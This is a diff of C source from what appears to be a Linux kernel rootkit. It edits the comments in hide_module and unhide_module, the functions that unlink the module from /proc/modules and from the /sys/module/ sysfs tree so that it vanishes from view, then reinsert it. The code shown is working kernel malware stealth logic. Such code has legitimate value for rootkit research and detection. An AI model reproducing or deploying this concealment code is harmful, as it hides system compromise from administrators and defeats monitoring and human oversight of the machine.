@@ -14,19 +14,20 @@ static struct list_head *mod;
 void
 hide_module(void)
 {
-    // sysfs directory entry
     struct kernfs_node *sd;
 
     if (mod)
         return;
 
     mod = THIS_MODULE->list.prev;
+
+    // sysfs directory entry
     sd = THIS_MODULE->mkobj.kobj.sd;
 
-    // Remove from the rbtree of modules
+    // Remove from the rbtree of modules (/sys/module/)
     rb_erase(&sd->rb, &sd->parent->dir.children);
 
-    // Remove from the list of modules
+    // Remove from the list of modules (/proc/modules)
     list_del(&THIS_MODULE->list);
 }
 
@@ -48,10 +49,10 @@ unhide_module(void)
     new = &root->rb_node;
     parent = NULL;
 
-    // Add back to the list of modules
+    // Add back to the list of modules (/proc/modules)
     list_add(&THIS_MODULE->list, mod);
 
-    { // Insert our module back into the rbtree of modules
+    { // Insert our module back into the rbtree of modules (/sys/module/)
         // Search for the place to insert, insert, then rebalance tree,
         // as per https://www.kernel.org/doc/Documentation/rbtree.txt
         while (*new) {
@@ -61,7 +62,7 @@ unhide_module(void)
             parent = *new;
             rb = rb_entry(*new, struct kernfs_node, rb);
 
-            // https://elixir.bootlin.com/linux/v4.19/source/include/linux/kernfs.h#L132
+            // https://elixir.bootlin.com/linux/v4.19/source/fs/kernfs/dir.c#L314
             // Recurse toward insert position based on 1. hash,
             // 2. (upon collision) namespace, and 3. (otherwise) name
             cmp = (sd->hash == rb->hash)
